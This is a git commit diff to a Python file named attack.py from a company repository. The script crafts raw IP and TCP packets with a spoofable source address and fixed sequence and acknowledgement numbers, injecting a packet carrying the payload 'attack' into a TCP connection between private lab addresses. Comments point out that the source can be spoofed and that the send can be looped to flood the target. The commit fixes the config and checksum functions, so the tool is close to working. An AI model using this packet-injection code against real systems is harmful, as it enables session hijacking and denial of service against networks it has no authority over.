eb5f2aef8a83807a3c68512794bbb03913c25694
jerry.cheng <jerry.cheng@infortrend.com>
2016-01-19 15:00:30 +0800

    update

--- cmds/network/client_server/attack.py
+++ cmds/network/client_server/attack.py
@@ -9,6 +9,22 @@ import socket, sys
 from struct import *
 import traceback
  
+
+case_1 = {'seq':2630708304, 'ack':1370969752}
+
+def config():
+	cfg = {
+		'ip':{
+			'src' : '172.27.112.178',
+			'dst' : '172.27.12.37',
+		},
+		'tcp':{
+			'src' : 40257,
+			'dst' : 9999,
+		},
+	}
+	return cfg
+
 def checksum(msg):
     s = 0
 
@@ -33,20 +49,8 @@ def rawsocket():
 		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
 		raise
 
-def config():
-	cfg = {
-		'ip':{
-			src_ip = '172.27.112.137',
-			dst_ip = '172.27.12.37',
-		},
-		'tcp':{
-			src_port = 47436,
-			dst_port = 9911,
-		},
-	}
-	return cfg
 
-def ip_header_create(src_ip, dst_ip):
+def ip_header_create(ip):
 	ip_ihl = 5
 	ip_ver = 4
 	ip_tos = 0
@@ -56,8 +60,8 @@ def ip_header_create(src_ip, dst_ip):
 	ip_ttl = 255
 	ip_proto = socket.IPPROTO_TCP
 	ip_check = 0    # kernel will fill the correct checksum
-	ip_saddr = socket.inet_aton ( src_ip )   #Spoof the source ip address if you want to
-	ip_daddr = socket.inet_aton ( dst_ip )
+	ip_saddr = socket.inet_aton ( ip['src'] )   #Spoof the source ip address if you want to
+	ip_daddr = socket.inet_aton ( ip['dst'] )
 	 
 	ip_ihl_ver = (ip_ver << 4) + ip_ihl
 	 
@@ -67,10 +71,10 @@ def ip_header_create(src_ip, dst_ip):
 	return ip_header
 
 def tcp_header_create(tcp_cfg, check_sum):
-	tcp_source = tcp_cfg['src_port']   # source port
-	tcp_dest = tcp_cfg['dst_port']   # destination port
-	tcp_seq = 3188268777
-	tcp_ack_seq = 4269447631
+	tcp_source = tcp_cfg['src']   # source port
+	tcp_dest = tcp_cfg['dst']   # destination port
+	tcp_seq = case_1['seq']
+	tcp_ack_seq = case_1['ack']
 	tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
 	#tcp flags
 	tcp_fin = 0
@@ -80,7 +84,7 @@ def tcp_header_create(tcp_cfg, check_sum):
 	tcp_ack = 1
 	tcp_urg = 0
 	tcp_window = socket.htons (5840)    #   maximum allowed window size
-	tcp_check = 0
+	tcp_check = check_sum
 	tcp_urg_ptr = 0
 	 
 	tcp_offset_res = (tcp_doff << 4) + 0
@@ -93,8 +97,8 @@ def tcp_header_create(tcp_cfg, check_sum):
 
 def pseudo_header_create(ip_cfg, tcp_cfg, data):
 	tcp_header = tcp_header_create(tcp_cfg, 0)
-	source_address = socket.inet_aton( ip_cfg['src_ip'] )
-	dest_address = socket.inet_aton(ip_cfg['dst_ip'])
+	source_address = socket.inet_aton( ip_cfg['src'] )
+	dest_address = socket.inet_aton(ip_cfg['dst'])
 	placeholder = 0
 	protocol = socket.IPPROTO_TCP
 	tcp_length = len(tcp_header) + len(data)
@@ -105,19 +109,19 @@ def pseudo_header_create(ip_cfg, tcp_cfg, data):
 
 def cal_checksum(cfg, data):
 	pseudo_header = pseudo_header_create(cfg['ip'], cfg['tcp'], data)
-	tcp_check = cal_checksum(pseudo_header)
+	tcp_check = checksum(pseudo_header)
 	return tcp_check
 	
 def main():
 	try:
 		cfg = config()
 		s = rawsocket()
-		ip_header = ip_header_create(cfg['src_ip'], cfg['dst_ip'])
+		ip_header = ip_header_create(cfg['ip'])
 		data = 'attack'
 		tcp_check = cal_checksum(cfg, data)
 		tcp_header = tcp_header_create(cfg['tcp'], tcp_check)
 		packet = ip_header + tcp_header + data
-		s.sendto(packet, (cfg['ip']['dst_ip'] , 0 ))    # put this in a loop if you want to flood the target
+		s.sendto(packet, (cfg['ip']['dst'] , 0 ))    # put this in a loop if you want to flood the target
 	except:
 		print traceback.format_exc()
 	
